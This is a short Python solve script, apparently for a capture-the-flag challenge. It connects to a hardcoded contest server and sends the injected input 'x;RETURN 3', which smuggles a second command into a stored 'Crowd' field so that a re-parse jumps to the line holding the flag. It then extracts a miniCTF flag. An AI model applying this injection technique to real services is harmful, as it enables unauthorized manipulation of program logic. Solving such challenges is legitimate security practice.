# Khai thác Tràn Bộ Nhớ: đầu độc dòng CROWD để khi refrain re-parse thì nhảy về dòng 3 (flag).
import re
import socket
import time

HOST, PORT = "103.116.52.180", 36107

s = socket.create_connection((HOST, PORT), timeout=15)
s.settimeout(2)
time.sleep(1)
try:
    while s.recv(4096):
        pass
except Exception:
    pass

s.sendall(b"x;RETURN 3\n")   # lưu thành 'Crowd: x;RETURN 3' -> vòng sau tách ra 'RETURN 3'

buf = b""
t = time.time()
while time.time() - t < 60:
    try:
        d = s.recv(4096)
        if not d:
            break
        buf += d
        if b"miniCTF{" in buf:
            break
    except socket.timeout:
        pass

m = re.search(rb"miniCTF\{[^}]*\}", buf)
print("flag:", m.group().decode() if m else "not found")
